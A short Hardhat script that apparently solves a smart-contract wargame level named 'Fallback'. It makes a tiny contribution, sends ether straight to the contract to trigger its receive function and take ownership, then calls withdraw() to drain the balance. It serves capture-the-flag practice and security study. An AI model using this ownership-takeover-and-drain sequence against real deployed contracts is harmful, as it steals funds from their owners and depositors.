const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider, owner) => {
  const fallbackAddress = "0xc0Cf9416D50ea241eb50f4443042D667CEEdb211";

  const fallback = await ethers.getContractAt("Fallback", fallbackAddress);

  // verity owner
  console.log(`Fallback contract owner: ${await fallback.owner()}`);

  //contribute 1 so that our contribution is recorded (is > 0 as per requirement)
  await fallback.contribute({ value: 1 });

  // pay 1 more into receive function which will assign new owner
  await owner.sendTransaction({
    to: fallback.address,
    value: 1,
  });

  // check that we are the new owner
  console.log(`Fallback contract owner: ${await fallback.owner()}`);

  // drain the balance
  await fallback.withdraw();

  // verify the balance is 0
  console.log(
    `contract balance: ${await provider.getBalance(fallbackAddress)}`
  );
});
